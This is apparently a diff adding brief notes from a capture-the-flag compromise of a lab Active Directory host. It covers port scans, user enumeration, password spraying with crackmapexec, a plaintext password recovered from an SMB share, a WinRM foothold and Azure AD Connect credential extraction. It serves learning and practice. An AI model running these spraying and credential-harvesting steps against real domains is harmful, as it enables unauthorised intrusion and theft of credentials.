@@ -1,0 +1,92 @@
+# Recon
+## all-tcp
+53/tcp    open  domain?
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-06-28 03:02:27Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+9389/tcp  open  mc-nmf        .NET Message Framing
+49667/tcp open  msrpc         Microsoft Windows RPC
+49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+49674/tcp open  msrpc         Microsoft Windows RPC
+49677/tcp open  msrpc         Microsoft Windows RPC
+49706/tcp open  msrpc         Microsoft Windows RPC
+49778/tcp open  msrpc         Microsoft Windows RPC
+
+# Enum
+# 53 DNS
+dig, nothing
+
+# 389 593 636 ldap
+./windapsearch.py -d megabank --dc-ip 10.10.10.172 -U
+=> same user info
+
+# 135,139,445 smb/netbios
+smbclient, smbmap, nothing.
+enum4linux -a =>
+index: 0xfd0 RID: 0xa35 acb: 0x00000210 Account: dgalanos       Name: Dimitris Galanos  Desc: (null)
+index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
+index: 0xfc3 RID: 0x641 acb: 0x00000210 Account: mhope  Name: Mike Hope Desc: (null)
+index: 0xfd1 RID: 0xa36 acb: 0x00000210 Account: roleary        Name: Ray O'Leary       Desc: (null)
+index: 0xfc5 RID: 0xa2a acb: 0x00000210 Account: SABatchJobs    Name: SABatchJobs       Desc: (null)
+index: 0xfd2 RID: 0xa37 acb: 0x00000210 Account: smorgan        Name: Sally Morgan      Desc: (null)
+index: 0xfc6 RID: 0xa2b acb: 0x00000210 Account: svc-ata        Name: svc-ata   Desc: (null)
+index: 0xfc7 RID: 0xa2c acb: 0x00000210 Account: svc-bexec      Name: svc-bexec Desc: (null)
+index: 0xfc8 RID: 0xa2d acb: 0x00000210 Account: svc-netapp     Name: svc-netapp        Desc: (null)
+
+Group 'Domain Users' (RID: 513) has member: MEGABANK\Administrator
+Group 'Domain Users' (RID: 513) has member: MEGABANK\krbtgt
+Group 'Domain Users' (RID: 513) has member: MEGABANK\AAD_987d7f2f57d2
+Group 'Domain Users' (RID: 513) has member: MEGABANK\mhope
+Group 'Domain Users' (RID: 513) has member: MEGABANK\SABatchJobs
+Group 'Domain Users' (RID: 513) has member: MEGABANK\svc-ata
+Group 'Domain Users' (RID: 513) has member: MEGABANK\svc-bexec
+Group 'Domain Users' (RID: 513) has member: MEGABANK\svc-netapp
+Group 'Domain Users' (RID: 513) has member: MEGABANK\dgalanos
+Group 'Domain Users' (RID: 513) has member: MEGABANK\roleary
+Group 'Domain Users' (RID: 513) has member: MEGABANK\smorgan
+
+Similar info got from rpcclient.
+
+use the user names as usernames and password,
+crackmapexec smb 10.10.10.172 -u users.txt -p users.txt --shares --continue-on-success
+=> MEGABANK.LOCAL\SABatchJobs:SABatchJobs
+
+ADMIN$          Disk      Remote Admin
+azure_uploads   Disk
+C$              Disk      Default share
+E$              Disk      Default share
+IPC$            IPC       Remote IPC
+NETLOGON        Disk      Logon server share
+SYSVOL          Disk      Logon server share
+users$          Disk
+
+## smb again
+sadly cannot use psexec or smbexec.
+azure_uploads doesn't have any files.
+smbmap -H 10.10.10.172 -R -u SABatchJobs -p SABatchJobs =>
+azure.xml => 4n0therD4y@n0th3r$
+crackmapexec smb 10.10.10.172 -u users.txt -p pass.txt => mhope:4n0therD4y@n0th3r$
+crackmapexec winrm 10.10.10.172 -u users.txt -p '4n0therD4y@n0th3r$' => positive
+
+# 5985 winrm
+use the password => get foothold.
+
+# Priv Esc
+find AD azure token.
+whoami /all => we are azure admins.
+(hint from ippsec's video)
+get this post: https://blog.xpnsec.com/azuread-connect-for-redteam/
+and find his gist https://gist.github.com/xpn/f12b145dba16c2eebdd1c6829267b90c
+but it failed because it cannot connect db.
+(hint again), just try what you found from the internet. Even try it, even blindly! With little modification at first. Since you don't know what it is.
+Use sqlcmd -Q "select @SERVERNAME" => to get the server name "MONTEVERDE".
+change the connection string to "Server=MONTEVERDE;Integrated Security=true;Initial Catalog=ADSync" => ok
+=> get root.
